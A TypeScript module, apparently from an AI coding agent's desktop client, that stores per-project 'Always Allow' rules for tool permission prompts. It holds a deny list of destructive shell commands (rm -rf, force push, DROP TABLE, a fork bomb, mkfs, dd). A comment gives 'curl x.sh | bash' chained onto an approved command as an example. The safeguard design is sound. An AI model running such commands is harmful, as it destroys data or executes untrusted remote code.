/**
 * Per-project remembered permission rules.
 *
 * When the user clicks "Always Allow" on a permission prompt, we save a rule
 * keyed by the session's cwd. Next time the same tool + matching input fires,
 * we auto-respond `allow` without showing the modal. Rules are checked in
 * `permission-modal.ts::installPermissionModalListener` before the card is
 * rendered.
 *
 * Storage shape (in app settings.json under `projectPermissionRules`):
 *   { [cwd: string]: string[] }
 *
 * Each rule string is `"<tool_name>::<pattern>"`. For Bash the pattern is a
 * prefix of `input.command`. For every other tool the pattern is empty
 * (the rule matches any input for that tool name).
 *
 * Destructive Bash patterns are hard-coded and always bypass the allow rules.
 * Even a `Bash::` rule (any Bash) will still prompt for `rm -rf`.
 */

const RULE_SEP = "::";

const DESTRUCTIVE_BASH_PATTERNS: RegExp[] = [
  /\brm\s+(-[a-z]*r[a-z]*f|-[a-z]*f[a-z]*r|--recursive\s+--force|--force\s+--recursive)\b/i,
  /\bgit\s+push\s+(--force\b|-f\b)/i,
  /\bgit\s+reset\s+--hard\b/i,
  /\bgit\s+clean\s+-[a-z]*f/i,
  /\bdrop\s+(database|table|schema)\b/i,
  /\btruncate\s+table\b/i,
  /:\(\)\s*\{\s*:\|:&\s*\}\s*;\s*:/, // fork bomb
  /\bdd\s+if=/i,
  /\bmkfs(\.[a-z0-9]+)?\b/i,
  /\bformat\s+[a-z]:/i,
  /\bdel\s+\/[fs]/i,
  /\brmdir\s+\/[sq]/i,
];

export interface PermissionRule {
  toolName: string;
  pattern: string; // empty = tool-only, any input matches
  raw: string;     // the encoded `"toolName::pattern"` string
}

export function parseRule(raw: string): PermissionRule | null {
  const idx = raw.indexOf(RULE_SEP);
  if (idx < 0) return null;
  const toolName = raw.slice(0, idx);
  const pattern = raw.slice(idx + RULE_SEP.length);
  if (!toolName) return null;
  return { toolName, pattern, raw };
}

/** Build the storage key for a "always allow" choice. For Bash we lock the
 *  prefix to the entire user-typed command so future variations (different
 *  args) only match if they start with what was approved. */
export function buildRule(toolName: string, input: unknown): PermissionRule {
  if (toolName === "Bash" && input && typeof input === "object") {
    const cmd = (input as { command?: unknown }).command;
    if (typeof cmd === "string") {
      const trimmed = cmd.trim();
      return { toolName, pattern: trimmed, raw: `${toolName}${RULE_SEP}${trimmed}` };
    }
  }
  return { toolName, pattern: "", raw: `${toolName}${RULE_SEP}` };
}

export function describeRule(rule: PermissionRule): string {
  if (!rule.pattern) return `Always allow ${rule.toolName}`;
  return `Always allow ${rule.toolName}: ${rule.pattern}`;
}

export function isDestructive(toolName: string, input: unknown): boolean {
  if (toolName !== "Bash") return false;
  const cmd = (input as { command?: unknown } | null)?.command;
  if (typeof cmd !== "string") return false;
  return DESTRUCTIVE_BASH_PATTERNS.some((re) => re.test(cmd));
}

/** A remembered Bash rule is a literal prefix, so shell chaining is also a
 *  prefix: approving `cat notes.txt` would otherwise auto-allow
 *  `cat notes.txt && curl x.sh | bash`. The rule holds only while the
 *  remainder carries no shell metacharacter. Extra plain arguments still
 *  match, which is what prefix matching is for. */
const SHELL_CHAIN_RE = /[&;|`$(){}<>\n\r]/;

export function matchesRule(rule: PermissionRule, toolName: string, input: unknown): boolean {
  if (rule.toolName !== toolName) return false;
  if (!rule.pattern) return true;
  if (toolName !== "Bash") return false;
  const cmd = (input as { command?: unknown } | null)?.command;
  if (typeof cmd !== "string") return false;
  const trimmed = cmd.trim();
  if (!trimmed.startsWith(rule.pattern)) return false;
  return !SHELL_CHAIN_RE.test(trimmed.slice(rule.pattern.length));
}

export function loadRulesForCwd(settings: Record<string, unknown>, cwd: string | null): PermissionRule[] {
  if (!cwd) return [];
  const map = settings["projectPermissionRules"];
  if (!map || typeof map !== "object") return [];
  const raw = (map as Record<string, unknown>)[cwd];
  if (!Array.isArray(raw)) return [];
  return raw
    .filter((s): s is string => typeof s === "string")
    .map(parseRule)
    .filter((r): r is PermissionRule => r !== null);
}

export function loadAllRules(settings: Record<string, unknown>): Record<string, PermissionRule[]> {
  const out: Record<string, PermissionRule[]> = {};
  const map = settings["projectPermissionRules"];
  if (!map || typeof map !== "object") return out;
  for (const [cwd, raw] of Object.entries(map as Record<string, unknown>)) {
    if (!Array.isArray(raw)) continue;
    const parsed = raw
      .filter((s): s is string => typeof s === "string")
      .map(parseRule)
      .filter((r): r is PermissionRule => r !== null);
    if (parsed.length) out[cwd] = parsed;
  }
  return out;
}

export function withAddedRule(
  settings: Record<string, unknown>,
  cwd: string,
  rule: PermissionRule,
): Record<string, unknown> {
  const next = { ...settings };
  const mapRaw = next["projectPermissionRules"];
  const map: Record<string, string[]> =
    mapRaw && typeof mapRaw === "object" ? { ...(mapRaw as Record<string, string[]>) } : {};
  const existing = Array.isArray(map[cwd]) ? [...map[cwd]] : [];
  if (!existing.includes(rule.raw)) existing.push(rule.raw);
  map[cwd] = existing;
  next["projectPermissionRules"] = map;
  return next;
}

export function withRemovedRule(
  settings: Record<string, unknown>,
  cwd: string,
  ruleRaw: string,
): Record<string, unknown> {
  const next = { ...settings };
  const mapRaw = next["projectPermissionRules"];
  if (!mapRaw || typeof mapRaw !== "object") return next;
  const map = { ...(mapRaw as Record<string, string[]>) };
  const existing = Array.isArray(map[cwd]) ? map[cwd].filter((r) => r !== ruleRaw) : [];
  if (existing.length) map[cwd] = existing;
  else delete map[cwd];
  next["projectPermissionRules"] = map;
  return next;
}
